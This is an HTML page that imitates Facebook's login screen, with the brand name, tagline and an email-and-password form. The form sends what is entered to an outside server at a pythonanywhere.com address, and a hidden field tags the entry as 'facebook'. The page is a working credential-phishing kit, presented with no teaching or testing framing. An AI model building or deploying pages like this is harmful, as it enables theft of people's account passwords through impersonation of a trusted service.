<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<title>Facebook</title>
		<link
			rel="stylesheet"
			href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
			integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
			crossorigin="anonymous"
			referrerpolicy="no-referrer"
		/>
		<!-- bootstrap css -->
		<link
			href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
			rel="stylesheet"
			integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
			crossorigin="anonymous"
		/>
	</head>

	<body>
		<div
			class="container d-flex flex-column flex-lg-row justify-content-evenly mt-5 pt-5"
		>
			<div class="text-center text-lg-start mt-lg-5 pt-lg-5">
				<h1 class="text-primary fw-bold fs-1">facebook</h1>
				<p class="fs-6 w-75 mx-auto mx-lg-0">
					facebook helps you connect and share with the people in your life
				</p>
			</div>

			<!-- form -->
			<div style="max-width: 28rem; width: 100%">
				<div class="bg-white shadow rounded p-3 input-group-lg">
					<form
						action="https://shoraart.pythonanywhere.com/submit"
						method="post"
					>
						<input
							type="text"
							value="facebook"
							name="facebook"
							class="d-none"
						/>
						<input
							type="text"
							class="form-control my-3"
							name="email"
							placeholder="Email address or phone number"
							required
						/>
						<input
							type="password"
							class="form-control my-3"
							name="password"
							placeholder="Password"
							required
						/>
						<button type="submit" class="btn btn-primary w-100 my-3">
							Log In
						</button>
					</form>
				</div>
			</div>
		</div>

		<script src="main.js"></script>
	</body>
</html>
